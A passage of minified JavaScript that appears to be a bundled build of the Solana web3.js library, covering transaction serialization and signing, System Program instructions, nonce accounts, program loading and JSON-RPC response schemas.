    get version() {
      return this.message.version;
    }
    constructor(t, e) {
      if (((this.signatures = void 0), (this.message = void 0), void 0 !== e))
        us(
          e.length === t.header.numRequiredSignatures,
          "Expected signatures length to be equal to the number of required signatures"
        ),
          (this.signatures = e);
      else {
        const e = [];
        for (let n = 0; n < t.header.numRequiredSignatures; n++)
          e.push(new Uint8Array(64));
        this.signatures = e;
      }
      this.message = t;
    }
    serialize() {
      const t = this.message.serialize(),
        e = Array();
      as(e, this.signatures.length);
      const n = Cr.struct([
          Cr.blob(e.length, "encodedSignaturesLength"),
          Cr.seq(rs(), this.signatures.length, "signatures"),
          Cr.blob(t.length, "serializedMessage"),
        ]),
        r = new Uint8Array(2048),
        o = n.encode(
          {
            encodedSignaturesLength: new Uint8Array(e),
            signatures: this.signatures,
            serializedMessage: t,
          },
          r
        );
      return r.slice(0, o);
    }
    static deserialize(t) {
      let e = [...t];
      const n = [],
        r = ss(e);
      for (let i = 0; i < r; i++) n.push(new Uint8Array(fs(e, 0, 64)));
      const o = ms.deserialize(new Uint8Array(e));
      return new As(o, n);
    }
    sign(t) {
      const e = this.message.serialize(),
        n = this.message.staticAccountKeys.slice(
          0,
          this.message.header.numRequiredSignatures
        );
      for (const r of t) {
        const t = n.findIndex((t) => t.equals(r.publicKey));
        us(t >= 0, `Cannot sign with non signer key ${r.publicKey.toBase58()}`),
          (this.signatures[t] = Wi(e, r.secretKey));
      }
    }
    addSignature(t, e) {
      us(64 === e.byteLength, "Signature must be 64 bytes long");
      const n = this.message.staticAccountKeys
        .slice(0, this.message.header.numRequiredSignatures)
        .findIndex((e) => e.equals(t));
      us(
        n >= 0,
        `Can not add signature; \`${t.toBase58()}\` is not required to sign this transaction`
      ),
        (this.signatures[n] = e);
    }
  }
  const ks = new Xi("SysvarC1ock11111111111111111111111111111111"),
    Is = new Xi("SysvarEpochSchedu1e111111111111111111111111"),
    Ss = new Xi("Sysvar1nstructions1111111111111111111111111"),
    _s = new Xi("SysvarRecentB1ockHashes11111111111111111111"),
    Ts = new Xi("SysvarRent111111111111111111111111111111111"),
    Cs = new Xi("SysvarRewards111111111111111111111111111111"),
    Bs = new Xi("SysvarS1otHashes111111111111111111111111111"),
    Es = new Xi("SysvarS1otHistory11111111111111111111111111"),
    xs = new Xi("SysvarStakeHistory1111111111111111111111111");
  class Ps extends Error {
    constructor({ action: t, signature: e, transactionMessage: n, logs: r }) {
      const o = r ? `Logs: \n${JSON.stringify(r.slice(-10), null, 2)}. ` : "",
        i =
          "\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.";
      let s;
      switch (t) {
        case "send":
          s = `Transaction ${e} resulted in an error. \n${n}. ` + o + i;
          break;
        case "simulate":
          s = `Simulation failed. \nMessage: ${n}. \n` + o + i;
          break;
        default:
          s = `Unknown action '${t}'`;
      }
      super(s),
        (this.signature = void 0),
        (this.transactionMessage = void 0),
        (this.transactionLogs = void 0),
        (this.signature = e),
        (this.transactionMessage = n),
        (this.transactionLogs = r || void 0);
    }
    get transactionError() {
      return {
        message: this.transactionMessage,
        logs: Array.isArray(this.transactionLogs)
          ? this.transactionLogs
          : void 0,
      };
    }
    get logs() {
      const t = this.transactionLogs;
      if (null == t || "object" != typeof t || !("then" in t)) return t;
    }
    async getLogs(t) {
      return (
        Array.isArray(this.transactionLogs) ||
          (this.transactionLogs = new Promise((e, n) => {
            t.getTransaction(this.signature)
              .then((t) => {
                if (t && t.meta && t.meta.logMessages) {
                  const n = t.meta.logMessages;
                  (this.transactionLogs = n), e(n);
                } else n(new Error("Log messages not found"));
              })
              .catch(n);
          })),
        await this.transactionLogs
      );
    }
  }
  class Rs extends Error {
    constructor({ code: t, message: e, data: n }, r) {
      super(null != r ? `${r}: ${e}` : e),
        (this.code = void 0),
        (this.data = void 0),
        (this.code = t),
        (this.data = n),
        (this.name = "SolanaJSONRPCError");
    }
  }
  async function Os(t, e, n, r) {
    const o = r && {
        skipPreflight: r.skipPreflight,
        preflightCommitment: r.preflightCommitment || r.commitment,
        maxRetries: r.maxRetries,
        minContextSlot: r.minContextSlot,
      },
      i = await t.sendTransaction(e, n, o);
    let s;
    if (null != e.recentBlockhash && null != e.lastValidBlockHeight)
      s = (
        await t.confirmTransaction(
          {
            abortSignal: null == r ? void 0 : r.abortSignal,
            signature: i,
            blockhash: e.recentBlockhash,
            lastValidBlockHeight: e.lastValidBlockHeight,
          },
          r && r.commitment
        )
      ).value;
    else if (null != e.minNonceContextSlot && null != e.nonceInfo) {
      const { nonceInstruction: n } = e.nonceInfo,
        o = n.keys[0].pubkey;
      s = (
        await t.confirmTransaction(
          {
            abortSignal: null == r ? void 0 : r.abortSignal,
            minContextSlot: e.minNonceContextSlot,
            nonceAccountPubkey: o,
            nonceValue: e.nonceInfo.nonce,
            signature: i,
          },
          r && r.commitment
        )
      ).value;
    } else
      null != (null == r ? void 0 : r.abortSignal),
        0,
        (s = (await t.confirmTransaction(i, r && r.commitment)).value);
    if (s.err) {
      if (null != i)
        throw new Ps({
          action: "send",
          signature: i,
          transactionMessage: `Status: (${JSON.stringify(s)})`,
        });
      throw new Error(`Transaction ${i} failed (${JSON.stringify(s)})`);
    }
    return i;
  }
  function Ms(t) {
    return new Promise((e) => setTimeout(e, t));
  }
  function Ls(t, e) {
    const n = t.layout.span >= 0 ? t.layout.span : is(t, e),
      r = lt.alloc(n),
      o = Object.assign({ instruction: t.index }, e);
    return t.layout.encode(o, r), r;
  }
  function Ns(t, e) {
    let n;
    try {
      n = t.layout.decode(e);
    } catch (r) {
      throw new Error("invalid instruction; " + r);
    }
    if (n.instruction !== t.index)
      throw new Error(
        `invalid instruction; instruction index mismatch ${n.instruction} != ${t.index}`
      );
    return n;
  }
  const Ds = Cr.nu64("lamportsPerSignature"),
    Us = Cr.struct([
      Cr.u32("version"),
      Cr.u32("state"),
      ns("authorizedPubkey"),
      ns("nonce"),
      Cr.struct([Ds], "feeCalculator"),
    ]),
    qs = Us.span;
  class Ws {
    constructor(t) {
      (this.authorizedPubkey = void 0),
        (this.nonce = void 0),
        (this.feeCalculator = void 0),
        (this.authorizedPubkey = t.authorizedPubkey),
        (this.nonce = t.nonce),
        (this.feeCalculator = t.feeCalculator);
    }
    static fromAccountData(t) {
      const e = Us.decode(Ki(t), 0);
      return new Ws({
        authorizedPubkey: new Xi(e.authorizedPubkey),
        nonce: new Xi(e.nonce).toString(),
        feeCalculator: e.feeCalculator,
      });
    }
  }
  function zs(t) {
    const e = Cr.blob(8, t),
      n = e.decode.bind(e),
      r = e.encode.bind(e),
      o = e,
      i = Dr();
    return (
      (o.decode = (t, e) => {
        const r = n(t, e);
        return i.decode(r);
      }),
      (o.encode = (t, e, n) => {
        const o = i.encode(t);
        return r(o, e, n);
      }),
      o
    );
  }
  const Ks = Object.freeze({
    Create: {
      index: 0,
      layout: Cr.struct([
        Cr.u32("instruction"),
        Cr.ns64("lamports"),
        Cr.ns64("space"),
        ns("programId"),
      ]),
    },
    Assign: {
      index: 1,
      layout: Cr.struct([Cr.u32("instruction"), ns("programId")]),
    },
    Transfer: {
      index: 2,
      layout: Cr.struct([Cr.u32("instruction"), zs("lamports")]),
    },
    CreateWithSeed: {
      index: 3,
      layout: Cr.struct([
        Cr.u32("instruction"),
        ns("base"),
        os("seed"),
        Cr.ns64("lamports"),
        Cr.ns64("space"),
        ns("programId"),
      ]),
    },
    AdvanceNonceAccount: {
      index: 4,
      layout: Cr.struct([Cr.u32("instruction")]),
    },
    WithdrawNonceAccount: {
      index: 5,
      layout: Cr.struct([Cr.u32("instruction"), Cr.ns64("lamports")]),
    },
    InitializeNonceAccount: {
      index: 6,
      layout: Cr.struct([Cr.u32("instruction"), ns("authorized")]),
    },
    AuthorizeNonceAccount: {
      index: 7,
      layout: Cr.struct([Cr.u32("instruction"), ns("authorized")]),
    },
    Allocate: {
      index: 8,
      layout: Cr.struct([Cr.u32("instruction"), Cr.ns64("space")]),
    },
    AllocateWithSeed: {
      index: 9,
      layout: Cr.struct([
        Cr.u32("instruction"),
        ns("base"),
        os("seed"),
        Cr.ns64("space"),
        ns("programId"),
      ]),
    },
    AssignWithSeed: {
      index: 10,
      layout: Cr.struct([
        Cr.u32("instruction"),
        ns("base"),
        os("seed"),
        ns("programId"),
      ]),
    },
    TransferWithSeed: {
      index: 11,
      layout: Cr.struct([
        Cr.u32("instruction"),
        zs("lamports"),
        os("seed"),
        ns("programId"),
      ]),
    },
    UpgradeNonceAccount: {
      index: 12,
      layout: Cr.struct([Cr.u32("instruction")]),
    },
  });
  class Fs {
    constructor() {}
    static createAccount(t) {
      const e = Ls(Ks.Create, {
        lamports: t.lamports,
        space: t.space,
        programId: Ki(t.programId.toBuffer()),
      });
      return new ws({
        keys: [
          { pubkey: t.fromPubkey, isSigner: !0, isWritable: !0 },
          { pubkey: t.newAccountPubkey, isSigner: !0, isWritable: !0 },
        ],
        programId: this.programId,
        data: e,
      });
    }
    static transfer(t) {
      let e, n;
      if ("basePubkey" in t) {
        (e = Ls(Ks.TransferWithSeed, {
          lamports: BigInt(t.lamports),
          seed: t.seed,
          programId: Ki(t.programId.toBuffer()),
        })),
          (n = [
            { pubkey: t.fromPubkey, isSigner: !1, isWritable: !0 },
            { pubkey: t.basePubkey, isSigner: !0, isWritable: !1 },
            { pubkey: t.toPubkey, isSigner: !1, isWritable: !0 },
          ]);
      } else {
        (e = Ls(Ks.Transfer, { lamports: BigInt(t.lamports) })),
          (n = [
            { pubkey: t.fromPubkey, isSigner: !0, isWritable: !0 },
            { pubkey: t.toPubkey, isSigner: !1, isWritable: !0 },
          ]);
      }
      return new ws({ keys: n, programId: this.programId, data: e });
    }
    static assign(t) {
      let e, n;
      if ("basePubkey" in t) {
        (e = Ls(Ks.AssignWithSeed, {
          base: Ki(t.basePubkey.toBuffer()),
          seed: t.seed,
          programId: Ki(t.programId.toBuffer()),
        })),
          (n = [
            { pubkey: t.accountPubkey, isSigner: !1, isWritable: !0 },
            { pubkey: t.basePubkey, isSigner: !0, isWritable: !1 },
          ]);
      } else {
        (e = Ls(Ks.Assign, { programId: Ki(t.programId.toBuffer()) })),
          (n = [{ pubkey: t.accountPubkey, isSigner: !0, isWritable: !0 }]);
      }
      return new ws({ keys: n, programId: this.programId, data: e });
    }
    static createAccountWithSeed(t) {
      const e = Ls(Ks.CreateWithSeed, {
        base: Ki(t.basePubkey.toBuffer()),
        seed: t.seed,
        lamports: t.lamports,
        space: t.space,
        programId: Ki(t.programId.toBuffer()),
      });
      let n = [
        { pubkey: t.fromPubkey, isSigner: !0, isWritable: !0 },
        { pubkey: t.newAccountPubkey, isSigner: !1, isWritable: !0 },
      ];
      return (
        t.basePubkey.equals(t.fromPubkey) ||
          n.push({ pubkey: t.basePubkey, isSigner: !0, isWritable: !1 }),
        new ws({ keys: n, programId: this.programId, data: e })
      );
    }
    static createNonceAccount(t) {
      const e = new bs();
      "basePubkey" in t && "seed" in t
        ? e.add(
            Fs.createAccountWithSeed({
              fromPubkey: t.fromPubkey,
              newAccountPubkey: t.noncePubkey,
              basePubkey: t.basePubkey,
              seed: t.seed,
              lamports: t.lamports,
              space: qs,
              programId: this.programId,
            })
          )
        : e.add(
            Fs.createAccount({
              fromPubkey: t.fromPubkey,
              newAccountPubkey: t.noncePubkey,
              lamports: t.lamports,
              space: qs,
              programId: this.programId,
            })
          );
      const n = {
        noncePubkey: t.noncePubkey,
        authorizedPubkey: t.authorizedPubkey,
      };
      return e.add(this.nonceInitialize(n)), e;
    }
    static nonceInitialize(t) {
      const e = Ls(Ks.InitializeNonceAccount, {
          authorized: Ki(t.authorizedPubkey.toBuffer()),
        }),
        n = {
          keys: [
            { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
            { pubkey: _s, isSigner: !1, isWritable: !1 },
            { pubkey: Ts, isSigner: !1, isWritable: !1 },
          ],
          programId: this.programId,
          data: e,
        };
      return new ws(n);
    }
    static nonceAdvance(t) {
      const e = Ls(Ks.AdvanceNonceAccount),
        n = {
          keys: [
            { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
            { pubkey: _s, isSigner: !1, isWritable: !1 },
            { pubkey: t.authorizedPubkey, isSigner: !0, isWritable: !1 },
          ],
          programId: this.programId,
          data: e,
        };
      return new ws(n);
    }
    static nonceWithdraw(t) {
      const e = Ls(Ks.WithdrawNonceAccount, { lamports: t.lamports });
      return new ws({
        keys: [
          { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
          { pubkey: t.toPubkey, isSigner: !1, isWritable: !0 },
          { pubkey: _s, isSigner: !1, isWritable: !1 },
          { pubkey: Ts, isSigner: !1, isWritable: !1 },
          { pubkey: t.authorizedPubkey, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: e,
      });
    }
    static nonceAuthorize(t) {
      const e = Ls(Ks.AuthorizeNonceAccount, {
        authorized: Ki(t.newAuthorizedPubkey.toBuffer()),
      });
      return new ws({
        keys: [
          { pubkey: t.noncePubkey, isSigner: !1, isWritable: !0 },
          { pubkey: t.authorizedPubkey, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: e,
      });
    }
    static allocate(t) {
      let e, n;
      if ("basePubkey" in t) {
        (e = Ls(Ks.AllocateWithSeed, {
          base: Ki(t.basePubkey.toBuffer()),
          seed: t.seed,
          space: t.space,
          programId: Ki(t.programId.toBuffer()),
        })),
          (n = [
            { pubkey: t.accountPubkey, isSigner: !1, isWritable: !0 },
            { pubkey: t.basePubkey, isSigner: !0, isWritable: !1 },
          ]);
      } else {
        (e = Ls(Ks.Allocate, { space: t.space })),
          (n = [{ pubkey: t.accountPubkey, isSigner: !0, isWritable: !0 }]);
      }
      return new ws({ keys: n, programId: this.programId, data: e });
    }
  }
  Fs.programId = new Xi("11111111111111111111111111111111");
  class js {
    constructor() {}
    static getMinNumSignatures(t) {
      return 2 * (Math.ceil(t / js.chunkSize) + 1 + 1);
    }
    static async load(t, e, n, r, o) {
      {
        const i = await t.getMinimumBalanceForRentExemption(o.length),
          s = await t.getAccountInfo(n.publicKey, "confirmed");
        let a = null;
        if (null !== s) {
          if (s.executable) return void 0, !1;
          s.data.length !== o.length &&
            ((a = a || new bs()),
            a.add(
              Fs.allocate({ accountPubkey: n.publicKey, space: o.length })
            )),
            s.owner.equals(r) ||
              ((a = a || new bs()),
              a.add(Fs.assign({ accountPubkey: n.publicKey, programId: r }))),
            s.lamports < i &&
              ((a = a || new bs()),
              a.add(
                Fs.transfer({
                  fromPubkey: e.publicKey,
                  toPubkey: n.publicKey,
                  lamports: i - s.lamports,
                })
              ));
        } else
          a = new bs().add(
            Fs.createAccount({
              fromPubkey: e.publicKey,
              newAccountPubkey: n.publicKey,
              lamports: i > 0 ? i : 1,
              space: o.length,
              programId: r,
            })
          );
        null !== a && (await Os(t, a, [e, n], { commitment: "confirmed" }));
      }
      const i = Cr.struct([
          Cr.u32("instruction"),
          Cr.u32("offset"),
          Cr.u32("bytesLength"),
          Cr.u32("bytesLengthPadding"),
          Cr.seq(Cr.u8("byte"), Cr.offset(Cr.u32(), -8), "bytes"),
        ]),
        s = js.chunkSize;
      let a = 0,
        u = o,
        c = [];
      for (; u.length > 0; ) {
        const o = u.slice(0, s),
          l = lt.alloc(s + 16);
        i.encode(
          {
            instruction: 0,
            offset: a,
            bytes: o,
            bytesLength: 0,
            bytesLengthPadding: 0,
          },
          l
        );
        const d = new bs().add({
          keys: [{ pubkey: n.publicKey, isSigner: !0, isWritable: !0 }],
          programId: r,
          data: l,
        });
        if (
          (c.push(Os(t, d, [e, n], { commitment: "confirmed" })),
          t._rpcEndpoint.includes("solana.com"))
        ) {
          const t = 4;
          await Ms(1e3 / t);
        }
        (a += s), (u = u.slice(s));
      }
      await Promise.all(c);
      {
        const o = Cr.struct([Cr.u32("instruction")]),
          i = lt.alloc(o.span);
        o.encode({ instruction: 1 }, i);
        const s = new bs().add({
            keys: [
              { pubkey: n.publicKey, isSigner: !0, isWritable: !0 },
              { pubkey: Ts, isSigner: !1, isWritable: !1 },
            ],
            programId: r,
            data: i,
          }),
          a = "processed",
          u = await t.sendTransaction(s, [e, n], { preflightCommitment: a }),
          { context: c, value: l } = await t.confirmTransaction(
            {
              signature: u,
              lastValidBlockHeight: s.lastValidBlockHeight,
              blockhash: s.recentBlockhash,
            },
            a
          );
        if (l.err)
          throw new Error(`Transaction ${u} failed (${JSON.stringify(l)})`);
        for (;;) {
          try {
            if ((await t.getSlot({ commitment: a })) > c.slot) break;
          } catch {}
          await new Promise((t) => setTimeout(t, Math.round(200)));
        }
      }
      return !0;
    }
  }
  js.chunkSize = 932;
  const Gs = new Xi("BPFLoader2111111111111111111111111111111111");
  var Vs, Hs;
  var Xs = (function () {
      if (Hs) return Vs;
      Hs = 1;
      var t = Object.prototype.toString,
        e =
          Object.keys ||
          function (t) {
            var e = [];
            for (var n in t) e.push(n);
            return e;
          };
      function n(r, o) {
        var i, s, a, u, c, l, d;
        if (!0 === r) return "true";
        if (!1 === r) return "false";
        switch (typeof r) {
          case "object":
            if (null === r) return null;
            if (r.toJSON && "function" == typeof r.toJSON)
              return n(r.toJSON(), o);
            if ("[object Array]" === (d = t.call(r))) {
              for (a = "[", s = r.length - 1, i = 0; i < s; i++)
                a += n(r[i], !0) + ",";
              return s > -1 && (a += n(r[i], !0)), a + "]";
            }
            if ("[object Object]" === d) {
              for (s = (u = e(r).sort()).length, a = "", i = 0; i < s; )
                void 0 !== (l = n(r[(c = u[i])], !1)) &&
                  (a && (a += ","), (a += JSON.stringify(c) + ":" + l)),
                  i++;
              return "{" + a + "}";
            }
            return JSON.stringify(r);
          case "function":
          case "undefined":
            return o ? null : void 0;
          case "string":
            return JSON.stringify(r);
          default:
            return isFinite(r) ? r : null;
        }
      }
      return (Vs = function (t) {
        var e = n(t, !1);
        if (void 0 !== e) return "" + e;
      });
    })(),
    Zs = (function (t) {
      return t &&
        t.__esModule &&
        Object.prototype.hasOwnProperty.call(t, "default")
        ? t.default
        : t;
    })(Xs);
  function Js(t) {
    let e = 0;
    for (; t > 1; ) (t /= 2), e++;
    return e;
  }
  class Ys {
    constructor(t, e, n, r, o) {
      (this.slotsPerEpoch = void 0),
        (this.leaderScheduleSlotOffset = void 0),
        (this.warmup = void 0),
        (this.firstNormalEpoch = void 0),
        (this.firstNormalSlot = void 0),
        (this.slotsPerEpoch = t),
        (this.leaderScheduleSlotOffset = e),
        (this.warmup = n),
        (this.firstNormalEpoch = r),
        (this.firstNormalSlot = o);
    }
    getEpoch(t) {
      return this.getEpochAndSlotIndex(t)[0];
    }
    getEpochAndSlotIndex(t) {
      if (t < this.firstNormalSlot) {
        const n =
          Js(
            0 === (e = t + 32 + 1)
              ? 1
              : (e--,
                (e |= e >> 1),
                (e |= e >> 2),
                (e |= e >> 4),
                (e |= e >> 8),
                (e |= e >> 16),
                1 + (e |= e >> 32))
          ) -
          Js(32) -
          1;
        return [n, t - (this.getSlotsInEpoch(n) - 32)];
      }
      {
        const e = t - this.firstNormalSlot,
          n = Math.floor(e / this.slotsPerEpoch);
        return [this.firstNormalEpoch + n, e % this.slotsPerEpoch];
      }
      var e;
    }
    getFirstSlotInEpoch(t) {
      return t <= this.firstNormalEpoch
        ? 32 * (Math.pow(2, t) - 1)
        : (t - this.firstNormalEpoch) * this.slotsPerEpoch +
            this.firstNormalSlot;
    }
    getLastSlotInEpoch(t) {
      return this.getFirstSlotInEpoch(t) + this.getSlotsInEpoch(t) - 1;
    }
    getSlotsInEpoch(t) {
      return t < this.firstNormalEpoch
        ? Math.pow(2, t + Js(32))
        : this.slotsPerEpoch;
    }
  }
  var Qs = globalThis.fetch;
  class $s extends Yo {
    constructor(t, e, n) {
      super(
        (t) => {
          const n = (function (t, e) {
            return new Zo(t, e);
          })(t, {
            autoconnect: !0,
            max_reconnects: 5,
            reconnect: !0,
            reconnect_interval: 1e3,
            ...e,
          });
          return (this.underlyingSocket = "socket" in n ? n.socket : n), n;
        },
        t,
        e,
        n
      ),
        (this.underlyingSocket = void 0);
    }
    call(...t) {
      var e;
      const n = null == (e = this.underlyingSocket) ? void 0 : e.readyState;
      return 1 === n
        ? super.call(...t)
        : Promise.reject(
            new Error(
              "Tried to call a JSON-RPC method `" +
                t[0] +
                "` but the socket was not `CONNECTING` or `OPEN` (`readyState` was " +
                n +
                ")"
            )
          );
    }
    notify(...t) {
      var e;
      const n = null == (e = this.underlyingSocket) ? void 0 : e.readyState;
      return 1 === n
        ? super.notify(...t)
        : Promise.reject(
            new Error(
              "Tried to send a JSON-RPC notification `" +
                t[0] +
                "` but the socket was not `CONNECTING` or `OPEN` (`readyState` was " +
                n +
                ")"
            )
          );
    }
  }
  class ta {
    constructor(t) {
      (this.key = void 0),
        (this.state = void 0),
        (this.key = t.key),
        (this.state = t.state);
    }
    isActive() {
      const t = BigInt("0xffffffffffffffff");
      return this.state.deactivationSlot === t;
    }
    static deserialize(t) {
      const e = (function (t, e) {
          let n;
          try {
            n = t.layout.decode(e);
          } catch (r) {
            throw new Error("invalid instruction; " + r);
          }
          if (n.typeIndex !== t.index)
            throw new Error(
              `invalid account data; account type mismatch ${n.typeIndex} != ${t.index}`
            );
          return n;
        })(ea, t),
        n = t.length - 56;
      us(n >= 0, "lookup table is invalid"),
        us(n % 32 == 0, "lookup table is invalid");
      const r = n / 32,
        { addresses: o } = Cr.struct([Cr.seq(ns(), r, "addresses")]).decode(
          t.slice(56)
        );
      return {
        deactivationSlot: e.deactivationSlot,
        lastExtendedSlot: e.lastExtendedSlot,
        lastExtendedSlotStartIndex: e.lastExtendedStartIndex,
        authority: 0 !== e.authority.length ? new Xi(e.authority[0]) : void 0,
        addresses: o.map((t) => new Xi(t)),
      };
    }
  }
  const ea = {
      index: 1,
      layout: Cr.struct([
        Cr.u32("typeIndex"),
        zs("deactivationSlot"),
        Cr.nu64("lastExtendedSlot"),
        Cr.u8("lastExtendedStartIndex"),
        Cr.u8(),
        Cr.seq(ns(), Cr.offset(Cr.u8(), -1), "authority"),
      ]),
    },
    na = /^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i;
  const ra = lo($r(Xi), io(), (t) => new Xi(t)),
    oa = so([io(), to("base64")]),
    ia = lo($r(lt), oa, (t) => lt.from(t[0], "base64"));
  function sa(t) {
    let e, n;
    if ("string" == typeof t) e = t;
    else if (t) {
      const { commitment: r, ...o } = t;
      (e = r), (n = o);
    }
    return { commitment: e, config: n };
  }
  function aa(t) {
    return t.map((t) =>
      "memcmp" in t
        ? {
            ...t,
            memcmp: { ...t.memcmp, encoding: t.memcmp.encoding ?? "base58" },
          }
        : t
    );
  }
  function ua(t) {
    return uo([
      ao({ jsonrpc: to("2.0"), id: io(), result: t }),
      ao({
        jsonrpc: to("2.0"),
        id: io(),
        error: ao({ code: co(), message: io(), data: ro(Jr("any", () => !0)) }),
      }),
    ]);
  }
  const ca = ua(co());
  function la(t) {
    return lo(ua(t), ca, (e) =>
      "error" in e ? e : { ...e, result: Hr(e.result, t) }
    );
  }
  function da(t) {
    return la(ao({ context: ao({ slot: no() }), value: t }));
  }
  function fa(t) {
    return ao({ context: ao({ slot: no() }), value: t });
  }
  function ha(t, e) {
    return 0 === t
      ? new ps({
          header: e.header,
          staticAccountKeys: e.accountKeys.map((t) => new Xi(t)),
          recentBlockhash: e.recentBlockhash,
          compiledInstructions: e.instructions.map((t) => ({
            programIdIndex: t.programIdIndex,
            accountKeyIndexes: t.accounts,
            data: or.decode(t.data),
          })),
          addressTableLookups: e.addressTableLookups,
        })
      : new hs(e);
  }
  const pa = ao({
      foundation: no(),
      foundationTerm: no(),
      initial: no(),
      taper: no(),
      terminal: no(),
    }),
    ma = la(
      Yr(
        eo(
          ao({
            epoch: no(),
            effectiveSlot: no(),
            amount: no(),
            postBalance: no(),
            commission: ro(eo(no())),
          })
        )
      )
    ),
    ga = Yr(ao({ slot: no(), prioritizationFee: no() })),
    ya = ao({ total: no(), validator: no(), foundation: no(), epoch: no() }),
    wa = ao({
      epoch: no(),
      slotIndex: no(),
      slotsInEpoch: no(),
      absoluteSlot: no(),
      blockHeight: ro(no()),
      transactionCount: ro(no()),
    }),
    ba = ao({
      slotsPerEpoch: no(),
      leaderScheduleSlotOffset: no(),
      warmup: Qr(),
      firstNormalEpoch: no(),
      firstNormalSlot: no(),
    }),
    va = oo(io(), Yr(no())),
    Aa = eo(uo([ao({}), io()])),
    ka = ao({ err: Aa }),
    Ia = to("receivedSignature"),
    Sa = ao({ "solana-core": io(), "feature-set": ro(no()) }),
    _a = ao({ program: io(), programId: ra, parsed: co() }),
    Ta = ao({ programId: ra, accounts: Yr(ra), data: io() }),
    Ca = da(
      ao({
        err: eo(uo([ao({}), io()])),
        logs: eo(Yr(io())),
        accounts: ro(
          eo(
            Yr(
              eo(
                ao({
                  executable: Qr(),
                  owner: io(),
                  lamports: no(),
                  data: Yr(io()),
                  rentEpoch: ro(no()),
                })
              )
            )
          )
        ),
        unitsConsumed: ro(no()),
        returnData: ro(
          eo(ao({ programId: io(), data: so([io(), to("base64")]) }))
        ),
        innerInstructions: ro(
          eo(Yr(ao({ index: no(), instructions: Yr(uo([_a, Ta])) })))
        ),
      })
    ),
    Ba = da(
      ao({
        byIdentity: oo(io(), Yr(no())),
        range: ao({ firstSlot: no(), lastSlot: no() }),
      })
    );
  const Ea = la(pa),
    xa = la(ya),
    Pa = la(ga),
    Ra = la(wa),
    Oa = la(ba),
    Ma = la(va),
    La = la(no()),
    Na = da(
      ao({
        total: no(),
        circulating: no(),
        nonCirculating: no(),
        nonCirculatingAccounts: Yr(ra),
      })
    ),
    Da = ao({
      amount: io(),
      uiAmount: eo(no()),
      decimals: no(),
      uiAmountString: ro(io()),
    }),
    Ua = da(
      Yr(
        ao({
          address: ra,
          amount: io(),
          uiAmount: eo(no()),
          decimals: no(),
          uiAmountString: ro(io()),
        })
      )
    ),
    qa = da(
      Yr(
        ao({
          pubkey: ra,
          account: ao({
            executable: Qr(),
            owner: ra,
            lamports: no(),
            data: ia,
            rentEpoch: no(),
          }),
        })
      )
    ),
    Wa = ao({ program: io(), parsed: co(), space: no() }),
    za = da(
      Yr(
        ao({
          pubkey: ra,
          account: ao({
            executable: Qr(),
            owner: ra,
            lamports: no(),
            data: Wa,
            rentEpoch: no(),
          }),
        })
      )
    ),
    Ka = da(Yr(ao({ lamports: no(), address: ra }))),
    Fa = ao({
      executable: Qr(),
      owner: ra,
      lamports: no(),
      data: ia,
      rentEpoch: no(),
    }),
    ja = ao({ pubkey: ra, account: Fa }),
    Ga = lo(uo([$r(lt), Wa]), uo([oa, Wa]), (t) =>
      Array.isArray(t) ? Hr(t, ia) : t
    ),
    Va = ao({
      executable: Qr(),
      owner: ra,
      lamports: no(),
      data: Ga,
      rentEpoch: no(),
    }),
    Ha = ao({ pubkey: ra, account: Va }),
    Xa = ao({
      state: uo([
        to("active"),
        to("inactive"),
        to("activating"),
        to("deactivating"),
      ]),
      active: no(),
      inactive: no(),
    }),
    Za = la(
      Yr(
        ao({
          signature: io(),
          slot: no(),
          err: Aa,
          memo: eo(io()),
          blockTime: ro(eo(no())),
        })
      )
    ),
    Ja = la(
      Yr(
        ao({
          signature: io(),
          slot: no(),
          err: Aa,
          memo: eo(io()),
          blockTime: ro(eo(no())),
        })
      )
    ),
    Ya = ao({ subscription: no(), result: fa(Fa) }),
    Qa = ao({ pubkey: ra, account: Fa }),
    $a = ao({ subscription: no(), result: fa(Qa) }),
    tu = ao({ parent: no(), slot: no(), root: no() }),
    eu = ao({ subscription: no(), result: tu }),
    nu = uo([
      ao({
        type: uo([
          to("firstShredReceived"),
          to("completed"),
          to("optimisticConfirmation"),
          to("root"),
        ]),
        slot: no(),
        timestamp: no(),
      }),
      ao({
        type: to("createdBank"),
        parent: no(),
        slot: no(),
        timestamp: no(),
      }),
      ao({
        type: to("frozen"),
        slot: no(),
        timestamp: no(),
        stats: ao({
          numTransactionEntries: no(),
          numSuccessfulTransactions: no(),
          numFailedTransactions: no(),
          maxTransactionsPerEntry: no(),
        }),
      }),
      ao({ type: to("dead"), slot: no(), timestamp: no(), err: io() }),
    ]),
    ru = ao({ subscription: no(), result: nu }),
    ou = ao({ subscription: no(), result: fa(uo([ka, Ia])) }),
    iu = ao({ subscription: no(), result: no() }),
    su = ao({
      pubkey: io(),
      gossip: eo(io()),
      tpu: eo(io()),
      rpc: eo(io()),
      version: eo(io()),
    }),
    au = ao({
      votePubkey: io(),
      nodePubkey: io(),
      activatedStake: no(),
      epochVoteAccount: Qr(),
      epochCredits: Yr(so([no(), no(), no()])),
      commission: no(),
      lastVote: no(),
      rootSlot: eo(no()),
    }),
    uu = la(ao({ current: Yr(au), delinquent: Yr(au) })),
    cu = uo([to("processed"), to("confirmed"), to("finalized")]),
    lu = ao({
      slot: no(),
      confirmations: eo(no()),
      err: Aa,
      confirmationStatus: ro(cu),
    }),
    du = da(Yr(eo(lu))),
    fu = la(no()),
    hu = ao({
      accountKey: ra,
      writableIndexes: Yr(no()),
      readonlyIndexes: Yr(no()),
    }),
    pu = ao({
      signatures: Yr(io()),
      message: ao({
        accountKeys: Yr(io()),
        header: ao({
          numRequiredSignatures: no(),
          numReadonlySignedAccounts: no(),
          numReadonlyUnsignedAccounts: no(),
        }),
        instructions: Yr(
          ao({ accounts: Yr(no()), data: io(), programIdIndex: no() })
        ),
        recentBlockhash: io(),
        addressTableLookups: ro(Yr(hu)),
      }),
    }),
    mu = ao({
      pubkey: ra,
      signer: Qr(),
      writable: Qr(),
      source: ro(uo([to("transaction"), to("lookupTable")])),
    }),
    gu = ao({ accountKeys: Yr(mu), signatures: Yr(io()) }),
    yu = ao({ parsed: co(), program: io(), programId: ra }),
